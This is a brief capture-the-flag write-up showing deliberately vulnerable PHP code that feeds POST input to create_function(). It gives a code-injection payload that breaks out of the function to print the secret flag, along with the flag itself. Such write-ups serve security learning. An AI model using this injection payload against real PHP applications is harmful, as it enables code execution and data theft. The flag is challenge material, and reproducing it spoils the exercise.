Source code given:
```
include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
?>
```
+ create_function() in php has a code injection.
+ Its exploit is publically available: https://www.exploit-db.com/exploits/32417
+ From the above exploit we got the payload as follows:
payload: return -1 * var_dump($a[""]);}echo $flag;/*"]
Thus we got the flag.
Flag: WEBSEC{HHVM_was_right_about_not_implementing_eval}
